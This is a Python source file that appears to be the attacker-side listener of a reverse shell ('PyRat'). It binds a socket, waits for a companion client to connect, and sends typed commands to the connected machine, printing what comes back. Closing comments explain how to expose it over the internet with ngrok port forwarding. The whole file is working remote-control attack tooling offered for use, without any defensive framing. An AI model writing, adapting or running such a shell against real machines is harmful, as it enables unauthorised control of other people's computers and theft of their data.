import socket
import sys
import time 

print("")
print("********************")
print("Python Reverse Shell")
print("********************")
print("")




def send_commands(s, conn):
    print("\nCtrl + C to kill the connection.")
    print("Use the normal cmd commands.")
    print("")
    print("$: ", end="")

#sends the commands to the PyRat_Client.py
    while True:
        try:
            cmd = input()
            if len(cmd) > 0:
                conn.sendall(cmd.encode())
                data = conn.recv(4096) # 4096 is better for heavy transfers!
                print(data.decode("utf-8"), end="")
        except KeyboardInterrupt:
            print("\neither you pressed Ctrl + C or the connection was broken for another reason")
            print("\nsession quit")
            conn.close()
            sys.exit()

#start server on ip(your local ip address*) and on Port(544)
def server(address):
    try:
        s = socket.socket()
        s.bind(address)
        s.listen()
        print("Server Initialized. Server is listening on port/IP(4)",port,host)
    except Exception as e:
        print("\nIt seems like something went wrong.")
        print(e)
        restart = input("\nDo you want me to reinitialize the server? y/n ")

    conn, client_addr = s.accept()
    print(f"Connection Established: {client_addr}")
    send_commands(s, conn)

if __name__ == "__main__":
    host = "your local ip address"
    port = 544
    server((host, port))

#* This Reverse shell works only on LAN!
#if u want to do this over the network (WAN), you have to Port forward with ngrok.
